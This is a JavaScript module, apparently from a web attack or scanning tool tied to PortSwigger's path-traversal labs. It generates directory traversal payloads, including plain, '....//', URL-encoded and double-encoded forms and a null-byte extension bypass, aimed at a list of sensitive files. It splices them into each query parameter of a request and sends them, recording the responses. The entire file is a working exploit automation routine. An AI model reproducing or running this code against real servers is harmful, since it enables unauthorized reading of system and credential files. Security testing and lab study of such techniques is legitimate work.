import { setup_response } from "../utils/methods.js";
import { interestingFiles } from "../utils/vars.js";

export default async function get_filepath(request) {
  // WORKING https://portswigger.net/web-security/file-path-traversal
  let results = [];
  let lstOfAttacks = [];

  const x = 10;
  // for (let x = 0; x < 10; x++) {
  for (let file in interestingFiles) {
    lstOfAttacks.push(`${"../".repeat(x)}${interestingFiles[file]}`);
    lstOfAttacks.push(`${"....//".repeat(x)}${interestingFiles[file]}`);
    lstOfAttacks.push(`${"%2e%2e%2f".repeat(x)}${interestingFiles[file]}`);
    lstOfAttacks.push(
      `${"%2e%2e%2e%2e%2f%2f".repeat(x)}${interestingFiles[file]}`
    );
    lstOfAttacks.push(`${"..%252f".repeat(x)}${interestingFiles[file]}`);
    // }
  }

  // console.log(lstOfAttacks);

  for (let index = 0; index < lstOfAttacks.length; index++) {
    const attack = lstOfAttacks[index];

    const theUrl = request.url.split("?")[0];

    const params = request.url.split("?")[1].split("&");

    let newUrl = `${theUrl}?`;

    params.forEach((element) => {
      newUrl += `${element.split("=")[0]}=`;

      if (
        element.split("=")[1] != undefined &&
        element.split("=")[1].includes("/")
      ) {
        const defaultPath = element.split("=")[1].split("/");
        defaultPath.pop();
        if (defaultPath !== "") {
          newUrl += `${defaultPath.join("/")}/`;
        }
      }

      newUrl += `${attack}`;

      const extension = element.split(".")[1];
      if (extension !== "" && extension !== undefined) {
        newUrl += `%00.${extension}`;
      }

      newUrl += `&`;
    });

    // console.log(newUrl);

    // setup the attack with the payload

    const theObject = {};

    theObject.fetch = `await fetch('${newUrl}', {
      method: '${request.method}',
    }).then((x) => x.text())`;

    await fetch(`${newUrl}`, {
      method: `${request.method}`,
    })
      .catch((error) => {
        console.log(error);
        return;
      })
      .then((x) => x.text())
      .then((x) => (theObject.result = x))
      .then(() => {
        results.push(theObject);
      });
  }

  setup_response(request, results, "File Path Traversal");
}
